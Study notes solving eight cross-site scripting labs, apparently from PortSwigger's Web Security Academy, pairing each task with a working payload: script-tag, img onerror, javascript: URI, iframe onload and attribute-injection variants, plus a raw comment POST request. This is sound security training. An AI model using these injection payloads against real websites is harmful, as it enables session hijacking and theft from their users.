
# Lab 1

## Description

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the `alert` function.

## Solution

Very easy:

```
/?search=hello<script>alert(1)</script>
```

# Lab 2

## Description

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.

## Solution

Commenting:

```
<script>alert(1)</script>
```

solves the lab -> very easy

# Lab 3

## Description

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

## Solution

Same as `Lab 1` but the `input` tag needs to be closed:

```
/?search=werwer"><script>alert(1)</script>
```

# Lab 4

## Description

This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.

To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

## Solution

Payload from `Lab 3` didn't trigger, using a simple bypass solves this:

```
/?search=werewr%27"><img+src=x+onerror=alert(1)>
```

A closing `</div>` tag could maybe do the trick given there is no filtering in place? -> to be tested for knowledge.

# Lab 5

## Description

This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.

To solve this lab, make the "back" link alert `document.cookie`.

## Solution

Was too tired to understand why my payloads didn't work -> used `DOM Invader`:

```
/feedback?returnPath=javascript:alert(1)
```


# Lab 6

## Description

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

## Solution

Go to exploit server and input:

```
Hello, world!
<iframe src="https://0a6d00df0379a2e780168f1000d100bd.web-security-academy.net/#"onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

View to confirm the payload launches (makes the view print in a loop). Then send to victim to solve the lab.


# Lab 7

## Description

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.

 ####  Hint

Just because you're able to trigger the `alert()` yourself doesn't mean that this will work on the victim. You may need to try injecting your proof-of-concept payload with a variety of different attributes before you find one that successfully executes in the victim's browser.

## Solution

Insert following payload into search param:

```
/?search=test"onmouseover="alert(1)
```

Tried `onload` instead of `onmouseover` but it didn't trigger.


# Lab 8

## Description

This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

## Solution

Write a comment on a blog post with the XSS payload inside the tag `website=` :

```
POST /post/comment HTTP/2
[...]

csrf=tlmKV3oBPeXwVbY9xnYqJHTgMMnELbLn&postId=3&comment=test&name=test&email=test%40test.com&website=javascript%3Aprompt%28%22XSS%22%29
```

The XSS triggers on visiting the link (located on the commenter's name).

